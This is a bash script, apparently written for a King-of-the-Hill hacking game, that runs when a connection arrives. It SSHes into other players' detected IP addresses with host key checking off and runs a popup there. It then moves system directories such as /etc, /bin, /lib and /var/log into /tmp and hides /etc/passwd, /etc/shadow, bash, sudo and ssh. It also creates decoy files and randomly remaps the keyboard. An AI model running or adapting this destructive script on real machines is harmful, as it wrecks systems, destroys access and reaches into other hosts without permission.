#!/bin/bash

source /usr/local/etc/my_info.conf

IP=$1
USERNAME=$2

LOG_DIR="/var/log/koth"
CONNECTION_LOG="$LOG_DIR/connection_attempts.log"
DISRUPTION_LOG="$LOG_DIR/disruption.log"
PLAYERS_IPS_FILE="/usr/local/etc/players_ips.txt"

mkdir -p $LOG_DIR

echo "$(date): Connection attempt from IP: $IP, USERNAME: $USERNAME" >> $CONNECTION_LOG

if ! [[ $IP =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || ! awk -v ip="$IP" 'BEGIN { split(ip, a, "."); for (i in a) if (a[i] < 0 || a[i] > 255) exit 1; }'; then
  echo "Invalid IP address format: $IP" >> $CONNECTION_LOG
  exit 1
fi

if [[ ${#USERNAME} -gt 32 ]] || ! [[ $USERNAME =~ ^[a-zA-Z0-9_]+$ ]]; then
  echo "Invalid USERNAME format: $USERNAME" >> $CONNECTION_LOG
  exit 1
fi

MY_IP=$(ip -o -4 addr show | grep -E 'tun|tap|eth|wlan' | awk '{print $4}' | cut -d'/' -f1 | head -n 1)

if [[ "$IP" == "$MY_HTB_IP" ]] && [[ "$USERNAME" == "$MY_SSH_USERNAME" ]]; then
  echo "Connection from myself. No action taken." >> $CONNECTION_LOG
  exit 0
fi

echo "$(date): Detecting active connections..." >> $DISRUPTION_LOG
ss -ntu | awk '{print $5}' | cut -d':' -f1 | grep -v -E "^$|127.0.0.1|::1|$MY_IP" | sort | uniq > $PLAYERS_IPS_FILE
echo "$(date): Detected the following active connections:" >> $DISRUPTION_LOG
cat $PLAYERS_IPS_FILE >> $DISRUPTION_LOG

for player_ip in $(cat $PLAYERS_IPS_FILE); do
  if [[ "$player_ip" != "$MY_IP" ]] && [[ "$player_ip" != "$IP" ]]; then
    ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no $USERNAME@$player_ip 'bash -s' << 'ENDSSH'
    python3 - << 'ENDPYTHON'
import tkinter as tk

def close_window():
    root.destroy()

root = tk.Tk()
root.title("Notification")
message = tk.Label(root, text="🍿 PREMIUM POPCORN 🔥", font=("Helvetica", 16))
message.pack(pady=20)
close_button = tk.Button(root, text="Close", command=close_window)
close_button.pack(pady=10)
root.mainloop()
ENDPYTHON
ENDSSH
  fi
done

mv /home/$USERNAME /tmp/$USERNAME

for dir in root etc var/log usr/local/bin usr/local/sbin usr/lib usr/include usr/share opt srv mnt media lib sbin bin; do
  mv /$dir /tmp/${dir}_hidden
done

mkdir -p /home/$USERNAME/Documents /home/$USERNAME/Downloads /home/$USERNAME/Desktop \
  /home/$USERNAME/Pictures /home/$USERNAME/Videos /home/$USERNAME/Music \
  /home/$USERNAME/Public /home/$USERNAME/Templates /home/$USERNAME/.config \
  /home/$USERNAME/.local/share

for file in important.doc financial_report.xlsx personal_notes.txt; do
  touch /home/$USERNAME/Documents/$file
done

for file in setup.exe installer.msi readme.txt; do
  touch /home/$USERNAME/Downloads/$file
done

for file in note.txt todo.txt; do
  touch /home/$USERNAME/Desktop/$file
done

for file in vacation.jpg family.png; do
  touch /home/$USERNAME/Pictures/$file
done

for file in movie.mp4 tutorial.avi; do
  touch /home/$USERNAME/Videos/$file
done

for file in song.mp3 playlist.m3u; do
  touch /home/$USERNAME/Music/$file
done

for file in shared_file.txt; do
  touch /home/$USERNAME/Public/$file
done

for file in template.docx; do
  touch /home/$USERNAME/Templates/$file
done

for file in config.ini; do
  touch /home/$USERNAME/.config/$file
done

for file in data.db; do
  touch /home/$USERNAME/.local/share/$file
done

mkdir -p /home/$USERNAME/.hidden
for file in /etc/passwd /etc/shadow /bin/bash /usr/bin/ssh /etc/hosts /etc/hostname \
  /etc/ssh/sshd_config /etc/network/interfaces /etc/resolv.conf /etc/cron.d \
  /etc/crontab /bin/sh /usr/bin/sudo /usr/bin/scp /usr/bin/wget /usr/bin/curl \
  /usr/bin/apt /usr/bin/yum /usr/bin/systemctl /usr/bin/service; do
  mv $file /home/$USERNAME/.hidden/$(basename $file)
done

if command -v xmodmap &>/dev/null; then
  keys=(a b c d e f g h i j k l m n o p q r s t u v w x y z \
        1 2 3 4 5 6 7 8 9 0 minus equal bracketleft bracketright \
        semicolon apostrophe grave backslash comma period slash)
  shuffled_keys=($(shuf -e "${keys[@]}"))
  for ((i = 0; i < ${#keys[@]}; i++)); do
    original_key="${keys[$i]}"
    new_key="${shuffled_keys[$i]}"
    keycode=$(xmodmap -pk | grep -w "$original_key" | awk '{print $1}')
    if [[ -n "$keycode" ]]; then
      xmodmap -e "keycode $keycode = $new_key"
    fi
  done
fi

echo "$(date): Allowed connection from $IP ($USERNAME)" >> $CONNECTION_LOG
